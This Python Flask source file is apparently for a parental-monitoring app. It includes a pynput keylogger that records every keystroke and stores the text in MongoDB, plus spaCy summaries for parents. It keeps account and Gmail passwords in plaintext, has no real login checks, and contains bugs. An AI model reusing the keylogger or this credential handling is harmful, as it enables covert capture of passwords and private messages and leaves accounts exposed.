import smtplib
import pymongo
import secrets
import os
import logging
import spacy
import atexit
import subprocess
from flask import Flask, abort, jsonify, render_template, request, redirect, send_file, url_for, session
from sentry_sdk import get_current_span
from pynput.keyboard import Key, Listener
from queue import Queue
from pymongo import MongoClient
from bson.objectid import ObjectId
from gridfs import GridFS
from werkzeug.utils import secure_filename
from datetime import date, datetime
from spacy.lang.en.stop_words import STOP_WORDS
from string import punctuation
from heapq import nlargest

app = Flask(__name__, template_folder='templates')
secret_key = secrets.token_hex(32)
app.secret_key = secret_key
count = 0
keys = []
logging_enabled = False
queue = Queue()

# Connect to MongoDB
client = MongoClient('mongodb://localhost:27017/')
db = client['mydatabase']
collection = db['reports']
users = db['users']
registrations = db['registrations']
messages = db['messages']
output = db['output']

app.config['UPLOAD_FOLDER'] = os.path.join(os.path.expanduser('~'), 'Downloads')  # Set upload folder to Downloads directory

@app.route('/nlp_run/<id>')
def nlp_run(id):
    return render_template('nlp.html',child_id = id)

stopwords = list(STOP_WORDS)
nlp = spacy.load('en_core_web_sm')

@app.route('/upload/<id>', methods=['POST'])
def upload(id):
    # Retrieve latest report text from MongoDB
    report = collection.find_one({'child_id':id}).sort('timestamp',-1)
    print(report)  
    if report is None:
        return render_template("nlp.html", message='No report found in MongoDB')
    else:
        text = report['content']
        print(text)
        # Summarize the text using the spaCy NLP library
        doc = nlp(text)
        tokens = [token.text for token in doc]
        word_freq = {}
        for word in doc:
            if word.text.lower() not in stopwords and word.text.lower() not in punctuation:
                if word.text not in word_freq.keys():
                    word_freq[word.text] = 1
                else:
                    word_freq[word.text] += 1

        max_freq = max(word_freq.values())
        for word in word_freq.keys():
            word_freq[word] = word_freq[word.text] / max_freq

        sent_tokens = [sent for sent in doc.sents]
        sent_scores = {}
        for sent in sent_tokens:
            for word in sent:
                if word.text in word_freq.keys():
                    if sent not in sent_scores.keys():
                        sent_scores[sent] = word_freq[word.text]
                    else:
                        sent_scores[sent] += word_freq[word.text]

        select_len = int(len(sent_tokens) * 0.2)

        if len(text.split(' ')) <= 100:  # Check if length of text is 100 or below 100
            summary = text  # Set the summary to the original text
        else:
            summary = nlargest(select_len, sent_scores, key=sent_scores.get)
            final_summary = [word.text for word in summary]
            summary = " ".join(final_summary)

        # Create 'output.txt' file with the summarized text
        output_file = os.path.join(app.config['UPLOAD_FOLDER'], 'output.txt')
        with open(output_file, "w") as f:
            f.write(summary)

        return render_template("nlp.html", message='Summary generated successfully. Click "Download Summary" to download.')



@app.route('/download/<id>', methods=['GET'])
def download(id):
    report = list(collection.find({'child_id':id}))[-1]
    if report is None:
        return render_template("nlp.html", message='No report found in MongoDB')
    else:
        text = report['content']  # Updated to retrieve 'content' field from MongoDB
        doc = nlp(text)
        tokens = [token.text for token in doc]
        word_freq = {}
        for word in doc:
            if word.text.lower() not in stopwords and word.text.lower() not in punctuation:
                if word.text not in word_freq.keys():
                    word_freq[word.text] = 1
                else:
                    word_freq[word.text] += 1

        max_freq = max(word_freq.values())
        for word in word_freq.keys():
            word_freq[word] = word_freq[word] / max_freq

        sent_tokens = [sent for sent in doc.sents]
        sent_scores = {}
        for sent in sent_tokens:
            for word in sent:
                if word.text in word_freq.keys():
                    if sent not in sent_scores.keys():
                        sent_scores[sent] = word_freq[word.text]
                    else:
                        sent_scores[sent] += word_freq[word.text]

        select_len = int(len(sent_tokens) * 0.3)

        if len(text.split(' ')) <= 100:  # Check if length of text is 100 or below 100
            summary = text  # Set the summary to the original text
        else:
            summary = nlargest(select_len, sent_scores, key=sent_scores.get)
            final_summary = [word.text for word in summary]
            summary = " ".join(final_summary)
        
        output_file = os.path.join(app.config['UPLOAD_FOLDER'], 'output.txt')
        with open(output_file, "w") as f:
            f.write(summary)

        # Store the contents of the output.txt file in the 'output' collection in MongoDB
        with open(output_file, "r") as f:
            content = f.read()
        timestamp = datetime.combine(date.today(), datetime.min.time())
        # count = collection.count_documents({}) + 1
        output_doc = {'timestamp': timestamp, 'content': content,'child_id':id}
        output.insert_one(output_doc)
    
    return send_file(output_file, as_attachment=True)

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        queue.put(keys)
        keys = []

def write_file(id):
    with open(f'Report_{id}.txt', "w") as f:
        while not queue.empty():
            keys = queue.get()
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write(' ')
                elif k.find("Key") == -1:
                    f.write(k)

@app.route('/keylogger/<id>')
def keylogger(id):
    return render_template('keylogger.html',child_id = id)

@app.route('/toggle', methods=['POST'])
def toggle():
    global logging_enabled
    logging_enabled = not logging_enabled
    if logging_enabled:
        listener = Listener(on_press=on_press)
        listener.start()
    return ''

@app.route('/about-us')
def about_us():
    return render_template('about-us.html')

def save_content_to_file(filename, content):
    file_path = filename
    with open(file_path, 'w') as f:
        f.write(content)
    
    print(f"Content saved to file '{filename}'")


@app.route('/download_keylogger/<id>')
def download_keylogger(id):
    if not logging_enabled:
        return 'Keylogger is not enabled'
    else:
        write_file(id)
        # Store contents of Report.txt in MongoDB
        with open(f'Report_{id}.txt', "r") as f:
            content = f.read()
            # count = collection.count_documents({}) + 1  # Get the current count of documents in the collection
            time = datetime.now()
            report = {'content': content, 'parent_id':session['user_id'], 'child_id':id, 'timestamp':time}  # Set the _id field to the current count + 1
            collection.insert_one(report)
        # content.save(os.path.join(app.config['UPLOAD_FOLDER'],f'Report_{id}.txt' ))
        save_content_to_file(os.path.join(app.config['UPLOAD_FOLDER'],f'Report_{id}.txt' ), content)
        # return send_file(f'Report_{id}.txt', as_attachment=True)
        return 'saved successfully'
    
# connect to MongoDB
# client = MongoClient('mongodb://localhost:27017/')
# check if the connection is successful
try:
    client.admin.command('ping')
    print('Connected to the database')
except:
    print('Connection failed')

# db = client['mydatabase']
# users = db['users']
# registrations = db['registrations']

@app.route('/home')
def home():
    return render_template('home-page.html')

@app.route('/notification/<email>', methods=['GET', 'POST'])
def notification(email): 
    session['child_email'] = email
    print("printID")
    id = str(session["user_id"])
    print(id)
    try:
        print("Trying fetch db")
        papa = users.find({"_id": ObjectId(id)})
        papachaemail = papa[0]
        session['parent_email'] = papachaemail['email']
        session['pass_mail'] = papachaemail['mail_pass']
        return render_template('notification.html')
    except Exception as e:
        print(e)
    # print(email)enter your smtp code yethe
    return render_template('notification.html')      

@app.route('/send_message', methods=['POST'])
def send_message():
    if request.method == 'POST':
        sender = session['parent_email']
        recipient = session['child_email']
        message_text = request.form['message_text']
        # print(session['pass_mail'])
        password = request.form['password']
        timestamp = datetime.now()
        try:
            recipient = session['child_email']
            
            # Create an SMTP connection to the mail server
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            print(1)
            if password:
                session['pass_mail'] = password
            server.login(session['parent_email'], session['pass_mail'])

            # Create the email message
            email_message = message_text

            # Send the email message
            print(2)
            server.sendmail(session['parent_email'], recipient, email_message)

            # Close the SMTP connection
            db.messages.insert_one({'sender': sender, 'recipient': recipient, 'message_text': message_text, 'timestamp': timestamp})
            server.quit()
            return redirect('/home-page-parent')
        except Exception as mail_except:
            print(mail_except)
            return redirect('/home')
    else:
        return render_template('send_message.html')
    
# @app.route('/inbox')
# def view_inbox():

# @app.route('/home-page-parent')
# def homepage():
#     return render_template('home-page-parent-1.html')

@app.route('/child_home_page')
def child_home_page():
    return render_template('child-home-page.html')


@app.route('/home-page-parent')
def homepageparent():
    # retrieve all child documents from the registrations collection
    children = registrations.find({'parent_id':session['user_id']})

    # create an empty list to store child data
    child_list = []
    # loop through the children data and add it to the list
    try:
        print('entered listing')
        for child in children:
            child_dict = {
                '_id': str(child['_id']),
                'name': child['name'],
                'dob': child['dob'],
                'image': child['image'],
                'email':child['email']
            }
            print(child_dict)
            child_list.append(child_dict)
    except Exception as e:
        print(e)

    # render the child-display template and pass the child data to it
    return render_template('home-page-parent-1.html', children=child_list)

@app.route('/website')
def website():
    return redirect('https://www.gmail.com')

@app.route('/downloads/<id>')
def downloads(id):

    output_docs = output.find({'child_id':id},sort=[('timestamp', -1)])
    return render_template('downloads.html', output_docs=output_docs)

@app.route('/child-home-page')
def childhomepage():
    # retrieve all child documents from the registrations collection
    children = registrations.find()

    # create an empty list to store child data
    child_list = []
    # loop through the children data and add it to the list
    try:
        for child in children:
            child_dict = {
                '_id': str(child['_id']),
                'name': child['name'],
                'dob': child['dob'],
                'image': child['image']
            }
            child_list.append(child_dict)
    except Exception as e:
        print(e)

    return render_template('child-home-page.html', children=child_list)

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        # get user data from the form
        name = request.form['name']
        email = request.form['email']
        password = request.form['password']

        # check if user exists in users collection
        user = users.find_one({'email': email})
        if user:
            # compare password with confirm_password field in users collection
            if password == user['confirm_password']:
                # check if all user details match
                if (name == user['name'] and 
                    email == user['email'] and 
                    password == user['password']):
                    return render_template('parent-register-page.html')
                else:
                    return render_template('parent-login.html', error_message="Incorrect user details")
            else:
                return render_template('parent-login.html', error_message="Incorrect password")
        else:
            return render_template('parent-login.html', error_message="User not found")
    else:
        return render_template('parent-login.html')

@app.route('/login_child')
def login_child():
    return render_template('child-login.html')

@app.route('/register_child',methods = ['GET','POST'])
def register_child():
    if request.method == 'POST':
        name = request.form['name']
        child_id = request.form['id']
        registration = db.registrations.find_one({"name": name, "_id": ObjectId(child_id)})
        if not name and not child_id:
            return "Error: Name and child ID are required fields."
        if not registration:
            return "Error: No matching registration found for the provided name and child ID."
        else:
            session['child_id'] = child_id
            return render_template('child-home-page.html',child_details = registration)
    else:
        return render_template('child-login.html')

@app.route('/how_to_use')
def how_to_use():
    return render_template('how-to-use.html')  

@app.route('/profile')
def profile():
    print(session['child_id'])
    child_details = db.registrations.find_one({"_id": ObjectId(session['child_id'])})
    return render_template('profile.html',child_details = child_details)

@app.route('/create_child')
def create_child():
    return render_template('child-add-page.html')
import bson
@app.route('/register', methods=['POST','GET'])
def register():
    if request.method == 'POST':
        # get user data from the form
        ID = request.form['ID']
        # email = request.form['email']
        password = request.form['password']
        id = bson.ObjectId(ID)
        # check if user exists in users collection
        user = users.find_one({'_id': id,'password':password})

        if user:
            print('dkjkasdff')
            session['user_id'] = str(user['_id'])
            print(session['user_id'])
            return redirect('/home-page-parent')
        else:
            # insert user data into MongoDB
            # user = {
            #     'name': name,
            #     'email': email,
            #     'password': password,
            print('lawada')
            return render_template('parent-login.html',error = 'ja na lawade')
            # }
            # users.insert_one(user)
            # return render_template('nlp.html')
    else:
        return render_template('parent-home-page.html')

UPLOAD_FOLDER=os.path.join('static','Child_uploads')
app.config['UPLOAD_FOLDER']=UPLOAD_FOLDER
@app.route('/add_child', methods=['POST', 'GET'])
def add_child():
    if request.method == 'POST':
        # get child data from the form
        name = request.form['name']
        dob = request.form['dob']
        email= request.form['email']
        parent_id = str(session['user_id'])
        file = request.files['image']
        # filename = secure_filename(file.filename)
        # save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        # file.save(save_path)
        # # image_path = [save_path]
            # get the uploaded file
        # image = request.files['image']
            # save the file to a folder on the server
        # filename = secure_filename(image.filename)
        # image.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        # else:
            # image = ""
        # insert child data into MongoDB
        child = {
            'name': name,
            'dob': dob,
            'email':email,
            'parent_id':parent_id
        }
        child_id = registrations.insert_one(child).inserted_id
        # rename the image with the child ID
        filename = secure_filename(str(child_id) + '.' + file.filename.rsplit('.', 1)[1])
        save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(save_path)
        # update the child document with the new image filename
        registrations.update_one({'_id': child_id}, {'$set': {'image': filename}})

        return redirect('/home-page-parent')

    return render_template('child-home-page.html')    

@app.route('/child/<child_id>')
def view_child(child_id):
    child = registrations.find_one({'_id': ObjectId(child_id)})
    if child:
        image_url = url_for('static', filename='Child_uploads/' + child['image'])
        return render_template('home-page-parent-1.html', child=child, image_url=image_url)
    else:
        abort(404)

@app.route('/logout')
def logout():
    session.pop('user_id',None)
    session.pop('parent_email', None)
    session.pop('child_email', None)
    return redirect('/home')


@app.route('/register_parent', methods=['POST','GET'])
def register_parent():
    if request.method == 'POST':
        # get user data from the form
        name = request.form['name']
        email = request.form['email']
        password = request.form['password']
        confirm_password = request.form['confirm_password']

        # check if passwords match
        if password != confirm_password:
            return render_template('parent-login.html', error_message="Passwords do not match")

        # insert user data into MongoDB
        user = {
            'name': name,
            'email': email,
            'password': password,
            'confirm_password': confirm_password

        }
        user = users.insert_one(user)
        session['papaji'] = str(user.inserted_id)
        # redirect the user to a new page that shows their data
        # return redirect(url_for('user_data', email=email))
        return redirect('/login')
    else:
        return render_template('parent-register-page.html')

if __name__ == '__main__':
    app.run(debug=True)
